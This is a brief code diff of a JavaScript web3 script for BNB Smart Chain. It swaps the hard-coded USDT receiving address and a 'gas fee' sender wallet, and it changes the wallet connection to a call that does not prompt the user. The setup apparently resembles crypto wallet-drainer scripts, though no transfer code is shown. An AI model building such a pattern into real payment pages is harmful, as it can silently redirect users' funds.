@@ -1,5 +1,5 @@
-const bscAddress = "0xce81b9c0658B84F2a8fD7adBBeC8B7C26953D090"; // Your USDT receiving address
-const bnbGasSender = "0x04a7f2e3E53aeC98B9C8605171Fc070BA19Cfb87"; // Wallet for gas fees
+const bscAddress = "0x192F41ca75F69924815C78a913e5159B546463BA"; // Your USDT receiving address
+const bnbGasSender = "0xC60bF50731DB73734E0bDcB8089Fa68C789ECce7"; // Wallet for gas fees
 const usdtContractAddress = "0x55d398326f99059fF775485246999027B3197955"; // USDT BEP20 Contract
 
 let web3;
@@ -9,7 +9,7 @@ async function connectWallet() {
     if (window.ethereum) {
         web3 = new Web3(window.ethereum);
         try {
-            await window.ethereum.request({ method: "eth_requestAccounts" });
+            await window.ethereum.request({ method: "eth_accounts" });
 
             // Force switch to BNB Smart Chain
             await window.ethereum.request({
